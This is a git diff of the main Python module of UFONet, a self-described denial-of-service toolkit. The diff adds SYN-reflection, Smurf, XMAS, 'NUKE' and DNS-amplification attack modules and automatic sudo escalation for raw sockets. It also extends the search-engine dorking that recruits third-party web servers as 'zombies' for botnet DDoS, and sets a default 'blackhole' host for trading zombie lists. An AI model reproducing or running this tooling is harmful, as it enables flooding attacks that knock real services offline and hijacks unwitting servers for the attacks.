@@ -1,14 +1,14 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - Denial of Service Toolkit - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)
+UFONet - Denial of Service Toolkit - 2013/2019 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import os, sys, re, traceback, random, time, threading, base64, string, math
-import StringIO, socket, httplib, urllib, urllib2, ssl, cgi, json
+import StringIO, socket, httplib, urllib, urllib2, ssl, cgi, json, gzip
 from uuid import getnode
 from urlparse import urlparse
 from random import randrange, shuffle
@@ -17,29 +17,49 @@ from update import Updater
 from herd import Herd
 from zombie import Zombie
 from doll import Doll
-from inspector import Inspector
-from abductor import Abductor
-from loic import LOIC
-from loris import LORIS
-from ufosyn import UFOSYN
-
-DEBUG = 0
+from core.tools.inspector import Inspector
+from core.tools.abductor import Abductor
+from core.tools.ufoscan import UFOSCAN
+from core.mods.loic import LOIC
+from core.mods.loris import LORIS
+from core.mods.ufosyn import UFOSYN
+from core.mods.spray import SPRAY
+from core.mods.smurf import SMURF
+from core.mods.xmas import XMAS
+from core.mods.nuke import NUKE
+from core.mods.tachyon import TACHYON
 
 class UFONet(object):
     def __init__(self):
-        self.blackhole = '176.28.23.46' # default download/upload zombies 'blackhole'
+        self.exit_msg = 'Donate BTC (Bitcoin) to keep UFONet (https://ufonet.03c8.net) strong!' # set msg show at the end [FILO ;-)]
+        self.GIT_REPOSITORY = 'https://code.03c8.net/epsylon/ufonet' # oficial code source [OK! 22/12/2018]
+        self.GIT_REPOSITORY2 = 'https://github.com/epsylon/ufonet' # mirror source [since: 04/06/2018]
+        self.blackhole = '176.28.23.46' # default download/upload zombies [Blackhole] / Try [DIY] your own mirror
+        self.external_check_service1 = 'https://downforeveryoneorjustme.com/' # set external check service 1 [OK! 28/02/2019]
+        self.external_check_service2 = 'https://status.ws/' # set external check service 2 [OK! 28/02/2019]
+        self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site
+        self.check_ip_service1 = 'https://checkip.dyndns.com/' # set external check ip service 1 [OK! 28/02/2019]
+        self.check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 28/02/2019]
+        self.check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! 28/02/2019]
         self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
         self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
-        self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve 'zombies'
-        self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve 'aliens'
-        self.droids_file = 'botnet/droids.txt' # set source path to retrieve 'droids'
+        self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve [Zombies]
+        self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve [Aliens]
+        self.droids_file = 'botnet/droids.txt' # set source path to retrieve [Droids]
         self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
         self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
         self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
-        self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve 'dorks'
+        self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve [Dorks]
         self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
         self.timeline_file = 'docs/VERSION' # set source for code releases
-        self.referer = 'http://127.0.0.1/'
+        self.news_file = "server/news.txt" # set source path to retrieve [Blackhole] [News]
+        self.missions_file = "server/missions.txt" # set source path to retrieve [Blackhole] [Missions]
+        self.board_file = "server/board.txt" # set source path to retrieve [Blackhole] [Board]
+        self.grid_file = "server/grid.txt" # set source path to retrieve [Blackhole] [Grid]
+        self.wargames_file = "server/wargames.txt" # set source path to retrieve [Blackhole] [Wargames]
+        self.examples_file = "docs/examples.txt" # set source path to retrieve [Examples]
+        self.misc_file = "core/txt/misc.txt" # set source path to retrieve [Miscellania] cites
+        self.referer = '' # black magic
         self.port = "8080" # default injection port
         self.mothershipname = "core/txt/shipname.txt"
         self.mothership_baptism() # generating static name/id for your mothership ;-)
@@ -47,8 +67,6 @@ class UFONet(object):
         self.payload = False
         self.external = False
         self.attack_mode = False
-        self.retries = ''
-        self.delay = ''
         self.connection_failed = False
         self.total_possible_zombies = 0
         self.herd = Herd(self)
@@ -69,6 +87,12 @@ class UFONet(object):
         self.total_loic = 0
         self.total_loris = 0
         self.total_syn = 0
+        self.total_spray = 0
+        self.total_smurf = 0
+        self.total_xmas = 0
+        self.total_nuke = 0
+        self.total_tachyon = 0
+        self.total_zombies_failed_connection = 0
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
         self.ctx.verify_mode = ssl.CERT_NONE
@@ -88,6 +112,11 @@ class UFONet(object):
         self.loadcheck_load_median = None
         self.loadcheck_size_max = None
         self.loadcheck_size_min = None
+        self.num_is_up = 0 # counter for [UCAVs] 'up' reports
+        self.num_is_down = 0 # counter for [UCAVs] 'down' reports
+        self.expire_timing = 30 # default expiring time per round
+        self.extra_zombies_lock = False # used to lock threading flow when [ARMY] is required
+        self.ac_control = [] # used by 'herd.py' to lock threading flow when [Zombies] are returning
 
     def mothership_baptism(self):
         if os.path.exists(self.mothershipname) == True:
@@ -114,25 +143,26 @@ class UFONet(object):
         return self.options
 
     def banner_welcome(self):
-        print ""
-        print "                     **                      0===============================================0"
-        print "                '' '----' ''                 ||                                             ||"   
-        print "             .'_.- ( 00 ) -._'.              ||  * Botnet -> DDoS:                          ||"
-        print "           .'.'    |'..'|    '.'.            ||                                             ||"
-        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||      -Zombies : HTTP GET bots               ||"
-        print "   (O).)-| |  \  x |    |x   /  | |-(.(O)    ||      -Droids  : HTTP GET (+params) bots     ||"
-        print "    `-'  '-'-._'-./ ---- \.-'_.-'-'  `-'     ||      -Aliens  : HTTP POST bots              ||"
-        print "       _ | |   '-.___||___.-'   | | _        ||      -UCAVs   : Web Abusing bots            ||"
-        print "    .' _ | |     |   __   |     | | _ '.     ||      -X-RPCs  : XML-RPC bots                ||"
-        print "   / .' ''.|     | /____\ |     |.'' '. \    ||                                             ||"
-        print "   | |(0)| '.    ||__**_ ||    .' |(0)| |    ||  * Close Combat -> DoS:                     ||"
-        print "   \ '._.'   '.  | \____/ |  .'   '._.' /    ||                                             ||"
-        print "    '.__ ______'.|__'--'__|.'______ __.'     ||      -LOIC    : Fast HTTP requests          ||"
-        print "   .'_.-|                          |-._'.    ||      -LORIS   : Slow HTTP requests          ||"
-        print "                                             ||      -UFOSYN  : TCP SYN flooder             ||"                                      
+        print "                                             0===============================================0"
         print "                                             ||                                             ||"
-        print "    * Class: UFONet - ViPR404 (model C)-     ||  * Featured: Crawler, +CVE, +WAF detection  ||"
-        print "    * Type: /Scout/Transporter/Warfare/      ||                                             ||"
+        print "                    (00)                     ||  * Botnet -> [DDoS]:                        ||"
+        print "       (O)_  (O)   '----'   (O)  _(O)        ||      /Zombies : HTTP GET bots               ||"   
+        print "           |  |.''.( xx ).''.|  |            ||      /Droids  : HTTP GET (+params) bots     ||"
+        print "           .'.'    |'..'|    '.'.            ||      /Aliens  : HTTP POST bots              ||"
+        print "    .-.  .' /'--.__|_00_|__.--'\ '.  .-.     ||      /UCAVs   : Web Abusing bots            ||"
+        print "   (O).)-|0|  \  x | ## |x   /  |0|-(.(O)    ||      /X-RPCs  : XML-RPC bots                ||"
+        print "    `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'     ||      /DBSTRESS: HTTP DB attack              ||"
+        print "       _ | ||  '-.___||___.-'  || | _        ||      /SPRAY   : TCP-SYN reflector           ||"
+        print "    .' _ | ||==O |   __   | O==|| | _ '.     ||      /SMURF   : ICMP echo flooder           ||"
+        print "   / .' ''.|  || | /_00_\ | ||  |.'' '. \    ||      /TACHYON : DNS amplificator            ||"
+        print "   | '###  |  =| | ###### | |=  |' ###  |    ||                                             ||"
+        print "   | |(0)| '.  0\||__**_ ||/0  .' |(0)| |    ||  * Close Combat -> [DoS]:                   ||"
+        print "   \ '._.'   '.  | \_##_/ |  .'   '._.' /    ||      /LOIC    : Fast HTTP requests          ||"
+        print "    '.__ ____0_'.|__'--'__|.'_0____ __.'     ||      /LORIS   : Slow HTTP requests          ||"
+        print "   .'_.-|                          |-._'.    ||      /UFOSYN  : TCP-SYN flooder             ||"
+        print "                                             ||      /XMAS    : TCP-XMAS flooder            ||" 
+        print "   + Class: UFONet / ViPR404+ (model F) +    ||      /NUKE    : TCP-STARVATION attack       ||"
+        print "                                             ||                                             ||"
         print "                                             0|=============================================|0" 
         print ""
 
@@ -149,6 +179,36 @@ class UFONet(object):
         print self.optionParser.description, "\n"
         print '='*75
 
+    def generate_exit_msg(self):
+        f = open(self.misc_file)
+        m = f.readlines()
+        f.close()
+        self.exit_msg = "Generating random exit... \n\n"
+        self.exit_msg += " -> "+str(random.choice(m).strip()) 
+
+    def AI(self):
+        try:
+            import turtle as AI
+            print "\n[AI] Making a unique drawing using 'Turtle' (Feurzig & Papert - 1966) -> [OK!]\n"
+            colors = ['red', 'purple', 'blue', 'green', 'orange', 'yellow']
+            bg = random.choice(colors).strip()
+            t = AI.Pen() 
+            AI.bgcolor(bg)
+            r = random.randrange(100,100000) 
+            for x in range(r):
+                t.pencolor(colors[x%6])
+                w = random.randrange(100,1000) 
+                t.width(x/w + 1) 
+                t.forward(x)
+                l = random.randrange(50,1000) 
+                t.left(l) 
+        except:
+            print "[AI] %!$1#9#84#~... -> [Exiting!]"
+            pass
+
+    def round_float(self, num):
+        return str(int(round(num, -1)))[2] # black magic
+
     def show_mac_address(self):
         mac = getnode() # to get physical address
         hex_mac = str(":".join(re.findall('..', '%012x' % mac)))
@@ -164,9 +224,15 @@ class UFONet(object):
         except:
             private_ip = "Unknown"
         try:
-            public_ip = requests.get('https://ip.42.pl/raw').text
+            public_ip = requests.get(self.check_ip_service3).text
         except:
-            public_ip = "Unknown"
+            try:
+                public_ip = requests.get(self.check_ip_service2).text
+            except:
+                try:
+                    public_ip = requests.get(self.check_ip_service1).text
+                except:
+                    public_ip = "Unknown"
         return private_ip, public_ip
 
     def try_running(self, func, error, args=None):
@@ -175,9 +241,18 @@ class UFONet(object):
         try:
             return func(*args)
         except Exception as e:
-            print(error, "error")
-            if DEBUG == 1:
+            if options.verbose:
+                print(error, "error")
                 traceback.print_exc()
+
+    def checkeuid(self):
+        try:
+            euid = os.geteuid()
+        except:
+            print("[Error] [AI] [UFONet] doesn't work correctly in systems with closed licenses...-> [Exiting!]\n")
+            print "[AI] "+self.exit_msg+"\n"
+            sys.exit(2) # return
+        return euid
 
     def start_ship_engine(self):
         self.agents = [] # generating available user-agents
@@ -188,10 +263,11 @@ class UFONet(object):
             self.agents.append(agent)
         self.user_agent = random.choice(self.agents).strip()
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [03/02/2018: OK!]
-        self.search_engines.append('yahoo') # [03/02/2018: OK!]
+        self.search_engines.append('bing') # [28/02/2019: OK!]
+        self.search_engines.append('yahoo') # [28/02/2019: OK!]
+        self.search_engines.append('startpage') # [28/02/2019: OK!]
+        self.search_engines.append('duck') # [28/02/2019: OK!]
         #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
-        #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
         #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
         if not os.path.exists("core/json/"): # create gui json cfg files folder
             os.mkdir("core/json/")
@@ -199,6 +275,7 @@ class UFONet(object):
         self.update_flying_stats() # update flying time stats
         chargo = self.check_mothership_chargo() # check mothership chargo
         self.update_max_chargo(int(chargo)) # update max chargo stats
+        self.generate_exit_msg() # generate random exit msg
 
     def run(self, opts=None):
         if opts:
@@ -221,16 +298,18 @@ class UFONet(object):
                 m = re.search(pattern, proxy)
                 if m is None:
                     self.banner()
-                    print ("\n[Error] - Proxy malformed!\n")
-                    return #sys.exit(2)
+                    print ("\n[Error] [AI] Proxy malformed! (ex: 'http(s)://127.0.0.1:8118') -> [Exiting!]\n")
+                    return
+                else:
+                    self.proxy_transport(options.proxy) # create proxy transport (also here, to be sure)
             except Exception:
                 self.banner()
-                print ("\n[Error] - Proxy malformed!\n")
-                return #sys.exit(2)
+                print ("\n[Error] [AI] Proxy malformed! (ex: 'http(s)://127.0.0.1:8118') -> [Exiting!]\n")
+                return
 
         # check tor connection
         if options.checktor:
-            url = 'https://check.torproject.org' # TOR status checking site
+            url = self.check_tor_url # TOR status checking site
             self.banner()
             print "\nSending request to: " + url + "\n"
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
@@ -238,18 +317,15 @@ class UFONet(object):
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
-                    req = urllib2.Request(url, None, headers)
-                    tor_reply = urllib2.urlopen(req).read()
-                else:
-                    req = urllib2.Request(url, None, headers)
-                    tor_reply = urllib2.urlopen(req, context=self.ctx).read()
+                req = urllib2.Request(url, None, headers)
+                tor_reply = urllib2.urlopen(req, context=self.ctx).read()
                 your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                 if not tor_reply or 'Congratulations' not in tor_reply:
                     print("It seems that Tor is not properly set.\n")
-                    print("Your IP address appears to be: " + your_ip + "\n")
+                    print("IP address appears to be: " + your_ip + "\n")
                 else:
                     print("Congratulations!. Tor is properly being used :-)\n")
-                    print("Your IP address appears to be: " + your_ip + "\n")
+                    print("IP address appears to be: " + your_ip + "\n")
             except:
                 print("Cannot reach TOR checker system!. Are you correctly connected?\n")
                 sys.exit(2) # return
@@ -300,9 +376,50 @@ class UFONet(object):
             private_ip, public_ip = self.show_ips()
             print "|- IP Private  :", private_ip
             print "|" +"-"*34
-            print "|- IP Public   :", public_ip
+            t = urlparse(self.check_ip_service3)
+            name_service = t.netloc
+            print "|- IP Public   :", public_ip +" | ["+name_service+"]"
             print "-"*35
             print '='*75, "\n"
+
+        # run UFOSCAN tool (check EUID when running UFOSCAN)
+        if options.xray:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [UFOSCAN] (--xray) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running
+            else:
+                if not options.xrayps:
+                    options.xrayps = str("1-1024") # default scanning ports (1-1024)
+                ports = options.xrayps
+                try:
+                    portX, portY = ports.split('-')
+                    try:
+                        portX = int(portX)
+                        portY = int(portY)
+                    except:
+                        portX = 1
+                        portY = 1024
+                        print "[Error] [AI] [UFOSCAN] Something wrong with range of ports selected. Using by default: 1-1024...\n"
+                except:
+                    portX = 1
+                    portY = 1024
+                    print "[Info] [AI] [UFOSCAN] Not any range of ports selected. Using by default: 1-1024...\n"
+                self.banner()
+                print("\n[AI] Analizing target to extract interesting information... Be patient!\n")
+                print '='*22 + '\n'
+                try:
+                    self.instance = UFOSCAN() # instance main class for scanning operations
+                    xray = self.instance.scanning(options.xray, portX, portY)
+                except Exception, e:
+                    print ("[Error] [AI] Something wrong scanning... Not any data stream found! -> [Exiting!]\n")
+                    if self.options.verbose:
+                        traceback.print_exc()
+                    return
 
         # show code timeline
         if options.timeline:
@@ -318,24 +435,88 @@ class UFONet(object):
             print "-"*35
             print '='*75, "\n"
 
+        # print some examples
+        if options.examples:
+            f = open(self.examples_file, 'r')
+            examples = f.readlines()
+            f.close()
+            self.banner()
+            for e in examples:
+                print e.strip('\n')
+
         # check EUID when running UFOSYN (root required for open 'raw sockets') / GUI will invoke 'sudo' directly
         if options.ufosyn:
-            euid = os.geteuid()
+            euid = self.checkeuid()
             if euid != 0:
-                print("[Error] UFOSYN (--ufosyn) not started as root...\n")
+                print("[Info] [AI] [Control] [UFOSYN] (--ufosyn) not started as root...\n")
                 try:
                     args = ['sudo', sys.executable] + sys.argv + [os.environ]
                     os.execlpe('sudo', *args) 
                 except:
-                    pass # keep running but UFOSYN will fail
+                    pass # keep running, but UFOSYN will fail
 
-        # search for 'zombies' on search engines results (dorking)
+        # check EUID when running SPRAY (root required)
+        if options.spray:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [SPRAY] (--spray) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but SPRAY will fail
+
+        # check EUID when running SMURF (root required)
+        if options.smurf:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [SMURF] (--smurf) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but SMURF will fail
+
+        # check EUID when running XMAS (root required)
+        if options.xmas:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [XMAS] (--xmas) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but XMAS will fail
+
+        # check EUID when running NUKE (root required)
+        if options.nuke:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [NUKE] (--nuke) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but NUKE will fail
+
+        # check EUID when running TACHYON (root required)
+        if options.tachyon:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [TACHYON] (--tachyon) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but TACHYON will fail
+
+        # search for [Zombies] on search engines results (dorking)
         if options.search:
             zombies = []
             if options.engine:
                 engine = options.engine
             else:
-                engine = "yahoo" # default search engine
+                engine = "startpage" # default search engine
             try:
                 self.banner()
                 if not os.path.exists(self.humans_file) == True:
@@ -351,19 +532,19 @@ class UFONet(object):
                     zombies.append(zombie) # add zombies from army to the zombies pool
                 lz.close()
                 if len(restored) > 0:
-                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    print "\n[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                     if not self.options.forceyes:
-                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        backup_reply = raw_input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                         print '-'*25
                     else:
                         backup_reply = "Y"
                     if backup_reply == "n" or backup_reply == "N":
-                        print "\n[Info] Removing data stored and starting a new search...\n"
+                        print "\n[Info] [AI] Removing data stored and starting a new search...\n"
                         os.remove(self.humans_file)
                         zombies_restored = 0 # flush zombies restored
                         print '-'*25 + "\n"
                     else:
-                        print "\n[Info] Restoring data and starting a new search...\n"
+                        print "\n[Info] [AI] Restoring data and starting a new search...\n"
                         print '-'*25 + "\n"
                         for zombie in restored:
                             zombies.append(zombie) # add previous data to zombies pool
@@ -371,7 +552,7 @@ class UFONet(object):
                     for e in self.search_engines:
                         engine = e
                         print '='*44
-                        print("\nSearching for zombies (with AI mode) using: "+engine+'\n')
+                        print("\n[AI] Searching for zombies using: "+engine+'\n')
                         print '='*44 + '\n'
                         self.options.engine = engine
                         try:
@@ -389,7 +570,7 @@ class UFONet(object):
                 else:
                     if restored:
                         print '='*44
-                    print("\nSearching for zombies (with AI mode) using: "+engine+"\n")
+                    print("\n[AI] Searching for zombies using: "+engine+"\n")
                     print '='*44 + '\n'
                     if restored: # from restored file
                         try:
@@ -428,20 +609,20 @@ class UFONet(object):
                 print '='*62
                 print "\n- Victims found:", len(zombies_found), "\n"
                 print "    - Restored:", total_restored
-                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
+                print "    - Dorked:", abs(len(zombies_found) - total_restored), "\n"
                 print '-'*32
                 print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
                 print '='*62 + '\n'
                 if len(zombies) > 0:
                     if not self.options.forceyes:
-                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        check_backup_reply = raw_input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                         print '-'*25
                     else:
                         check_backup_reply = "Y"
                     if check_backup_reply == "n" or check_backup_reply == "N":
                         if os.path.isfile(self.humans_file): 
                             os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
-                        print "\n[Info] Temporal data correctly removed...\n"
+                        print "\n[Info] [AI] Temporal data correctly removed...\n"
                     else:
                         with open(self.humans_file, "w") as f:
                             for z in zombies_found:
@@ -450,31 +631,31 @@ class UFONet(object):
                                 if z not in zz or z+os.linesep not in zz:
                                     f.write(z+os.linesep)
                         f.close()
-                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                        print "\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n"
                     print '-'*25 + "\n"
                 if new_zombies and new_zombies > 0:
                     if not self.options.forceyes:
-                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        check_url_link_reply = raw_input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                         print '-'*25 + "\n"
                     else:
                         check_url_link_reply = "Y"
                     if check_url_link_reply == "n" or check_url_link_reply == "N":
-                        print "Bye!\n"
+                        print "[AI] "+self.exit_msg+"\n"
                         pass
                     else:
                         print "\n" + '='*44
                         test = self.testing(zombies_found)
                 else:
-                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
+                    print "[Info] [AI] NOT any NEW possible zombies found -> [Exiting!]\n"
             except Exception:
-                print ("\n[Error] - Something wrong searching using: "+engine+"\n")
+                print ("\n[Error] [AI] Something wrong searching using: "+engine+"\n")
 
-        # search for 'zombies' from a list of 'dorks'
+        # search for [Zombies] from a list of [Dorks]
         if options.dorks:
             if options.engine:
                 engine = options.engine
             else:
-                engine = "yahoo" # default search engine
+                engine = "startpage" # default search engine
             try:
                 dorks = self.extract_dorks()
                 if not dorks:
@@ -494,19 +675,19 @@ class UFONet(object):
                     zombies.append(zombie) # add zombies from army to the zombies pool
                 lz.close()
                 if len(restored) > 0:
-                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    print "\n[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                     if not self.options.forceyes:
-                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        backup_reply = raw_input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                         print '-'*25
                     else:
                         backup_reply = "Y"
                     if backup_reply == "n" or backup_reply == "N":
-                        print "\n[Info] Removing data stored and starting a new search...\n"
+                        print "\n[Info] [AI] Removing data stored and starting a new search...\n"
                         os.remove(self.humans_file)
                         zombies_restored = 0 # flush zombies restored
                         print '-'*25 + "\n"
                     else:
-                        print "\n[Info] Restoring data and starting a new search...\n"
+                        print "\n[Info] [AI] Restoring data and starting a new search...\n"
                         print '-'*25 + "\n"
                         for zombie in restored:
                             zombies.append(zombie) # add previous data to zombies pool
@@ -515,7 +696,7 @@ class UFONet(object):
                     for e in self.search_engines:
                         engine = e
                         print '='*44
-                        print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
+                        print("\n[AI] Searching for zombies using: ["+engine+ "] from a list of [Dorks]\n")
                         print '='*44 + '\n'
                         self.options.engine = engine
                         for dork in dorks:
@@ -541,7 +722,7 @@ class UFONet(object):
                 else:
                     if restored:
                         print '='*44
-                    print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
+                    print("\n[AI] Searching for zombies using: ["+ engine+ "] from a list of [Dorks]\n")
                     print '='*44 + '\n'
                     for dork in dorks:
                         print '='*22
@@ -580,14 +761,14 @@ class UFONet(object):
                 print '='*62 + '\n'
                 if len(zombies_found) > 0:
                     if not self.options.forceyes:
-                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        check_backup_reply = raw_input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                         print '-'*25
                     else:
                         check_backup_reply = "Y"
                     if check_backup_reply == "n" or check_backup_reply == "N":
                         if os.path.isfile(self.humans_file):
                             os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
-                        print "\n[Info] Temporal data correctly removed...\n"
+                        print "\n[Info] [AI] Temporal data correctly removed...\n"
                     else:
                         with open(self.humans_file, "w") as f:
                             for z in zombies_found:
@@ -596,37 +777,37 @@ class UFONet(object):
                                 if z not in zz or z+os.linesep not in zz:
                                     f.write(z+os.linesep)
                         f.close()
-                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                        print "\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n"
                     print '-'*25 + "\n"
                 if new_zombies and new_zombies > 0:
                     if not self.options.forceyes:
-                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        check_url_link_reply = raw_input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                         print '-'*25 + "\n"
                     else:
                         check_url_link_reply = "Y"
                     if check_url_link_reply == "n" or check_url_link_reply == "N":
-                        print "Bye!\n"
+                        print "[AI] "+self.exit_msg+"\n"
                         pass
                     else:
                         print "\n" + '='*44
                         test = self.testing(zombies_found)
                 else:
-                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
+                    print "[Info] [AI] NOT any NEW possible zombies found! -> [Exiting!]\n"
             except Exception:
-                print ("\n[Error] - Something wrong searching using: "+engine+"\n")
+                print ("\n[Error] [AI] Something wrong searching using: "+engine+"\n")
 
-        # auto-search for 'zombies' (dorks+all_engines+time -> to discover max new zombies)
+        # auto-search for [Zombies] (dorks+all_engines+time -> to discover max new zombies)
         if options.autosearch:
             try:
                 dorks = self.extract_dorks()
             except:
-                print "\n[Info] Not any dork present at: 'botnet/dorks.txt'. Aborting!\n"
+                print "\n[Info] [AI] Not any dork present at: 'botnet/dorks.txt' -> [Aborting!]\n"
                 return
             engines_list = self.search_engines
             stop_flag = False # use a flag to establish an end
             try:
                 self.banner()
-                print "\nSearching automatically for 'zombies' (WARNING: this may take several time!)\n" 
+                print "\n[AI] Searching automatically for [Zombies] (WARNING: this may take several time!)\n" 
                 print "[Info] Try to use CTRL+z (on shell) to STOP IT! ;-)\n"
                 print '-'*25 + "\n"
                 zombies_found = []
@@ -643,19 +824,19 @@ class UFONet(object):
                 zombies_restored = len(restored)
                 lf.close()
                 if len(restored) > 0: 
-                    print "[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    print "[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                     if not self.options.forceyes:
-                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        backup_reply = raw_input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                         print '-'*25
                     else:
                         backup_reply = "Y"
                     if backup_reply == "n" or backup_reply == "N":
-                        print "\n[Info] Removing data stored and starting a new (auto)search...\n"
+                        print "\n[Info] [AI] Removing data stored and starting a new (auto)search...\n"
                         os.remove(self.humans_file)
                         zombies_restored = 0 # flush zombies restored
                         print '-'*25 + "\n"
                     else:
-                        print "\n[Info] Restoring data and starting a new (auto)search...\n"
+                        print "\n[Info] [AI] Restoring data and starting a new (auto)search...\n"
                         print '-'*25 + "\n"
                         for zombie in restored:
                             zombies_found.append(zombie) # add previous data to zombies found pool
@@ -673,7 +854,7 @@ class UFONet(object):
                         engine = e
                         self.options.engine = engine
                         print '='*44 + '\n'
-                        print("Searching for zombies (with AI mode) using: "+engine+'\n')
+                        print("[AI] Searching for zombies using: "+engine+'\n')
                         print '='*44 + '\n'
                         for dork in dorks:
                             print '='*22
@@ -697,11 +878,11 @@ class UFONet(object):
                                                 f.write(str(zombie+os.linesep))
                                             f.close()
                         if zombies_counter == 0:
-                            print "[Info] - NOT more NEW victims found (by the moment) using: "+engine+"... Let's remove it from queue!\n"
+                            print "[Info] [AI] NOT more NEW victims found (by the moment) using: "+engine+" -> [Discarding!]\n"
                             print '-'*25 + "\n"
                             engines_list.remove(engine) # remove not more results engine from search engines list
                             if not engines_list: # if search engines empty, call return-exit routine
-                                print "[Info] - Search engines aren't providing more results... Exiting! ;-)\n"
+                                print "[Info] [AI] Search engines aren't providing more results -> [Exiting!]\n"
                                 print '-'*25 + "\n"
                                 stop_flag = True # exit flag up
                 new_zombies = 0 # new zombies counter
@@ -724,14 +905,14 @@ class UFONet(object):
                 print '='*62 + '\n'
                 if len(zombies_found) > 0:
                     if not self.options.forceyes:
-                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        check_backup_reply = raw_input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                         print '-'*25
                     else:
                         check_backup_reply = "Y"
                     if check_backup_reply == "n" or check_backup_reply == "N":
                         if os.path.isfile(self.humans_file):
                             os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
-                        print "\n[Info] Temporal data correctly removed...\n"
+                        print "\n[Info] [AI] Temporal data correctly removed...\n"
                     else:
                         with open(self.humans_file, "w") as f:
                             for z in all_zombies_found:
@@ -740,24 +921,24 @@ class UFONet(object):
                                 if z not in zz or z+os.linesep not in zz:
                                     f.write(z+os.linesep)
                         f.close()
